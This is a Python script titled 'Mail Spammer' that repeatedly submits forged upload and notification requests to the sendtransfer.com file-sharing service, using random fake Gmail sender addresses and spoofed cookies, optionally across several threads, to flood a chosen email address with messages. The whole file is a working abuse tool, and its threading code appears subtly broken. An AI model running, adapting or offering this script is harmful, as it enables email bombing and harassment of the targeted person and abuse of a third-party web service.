from requests import *
import random
import argparse
import sys
import threading as Th

def parser():
    parser = argparse.ArgumentParser(prog='Mail Spammer')

    parser.add_argument("-m", "--multi", help="Multithreading?", dest="multi", default=False)
    parser.add_argument("-t", "--to", help="Destination", dest="mail")
    parser.add_argument("-n", "--num", help="Number of letters to send", dest="num", type=int)

    args = vars(parser.parse_args())
    main(args)


def main(args):
    if args["multi"] != False:
        withmulti(args)

    else:
        sender(args["num"], args["mail"])

def withmulti(args):
    th = (Th.Thread(target=sender, args=[args["num"], args["mail"]]) for i in range(args["multi"]))
    for t in th:
        t.start()
    for t in th:
        t.join()

def sender(num, mail):
    for i in range(num):
        randomid = str(random.randint(0, 100000))
        print("mail -", randomid + "@gmail.com")

        header1 = {"Content-Type": "multipart/form-data; boundary=---------------------------3",
                   "Content-Length": "371",
                   "Connection": "keep-alive",
                   "Cookie": "odesilatel=" + randomid + "%40gmail.com; PHPSESSID=aaa"}

        data2 = "odesilatel=" + randomid + "%40gmail.com&zprava=codeby&prijemce=%5B%22" + mail.split("@")[0] + "%40" + \
        mail.split("@")[1] + "%22%2C%22" + mail.split("@")[0] + "%40" + mail.split("@")[1] + "%22%5D&expirace=7&upozornit=0"

        header2 = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "X-Requested-With": "XMLHttpRequest",
                   "Content-Length": "137",
                   "Connection": "keep-alive",
                   "Cookie": "odesilatel=" + randomid + "%40gmail.com; PHPSESSID=aaa"}

        data1 = "--------------------------3\r\nContent-Disposition: form-data; name=\"cs\"\r\n\r\n1\r\n-----------------------------3\r\nContent-Disposition: form-data; name=\"cspoc\"\r\n\r\n1\r\n-----------------------------3\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"as.txt\"\r\nContent-Type: text/plain\r\n\r\n.\r\n-----------------------------3--\r\n"

        req1 = post("https://www.sendtransfer.com/server/php/", data=data1, headers=header1)
        req2 = post("https://www.sendtransfer.com/server/php/mejl.php", data=data2, headers=header2)
        print("DONE:", i+1, "/", num,"\nResponse code:", "1 - ", str(req1).split("[")[1].split("]")[0], "  2 - ",
              str(req2).split("[")[1].split("]")[0], "\n")


if __name__ == '__main__':
    parser()

print("Finished!")
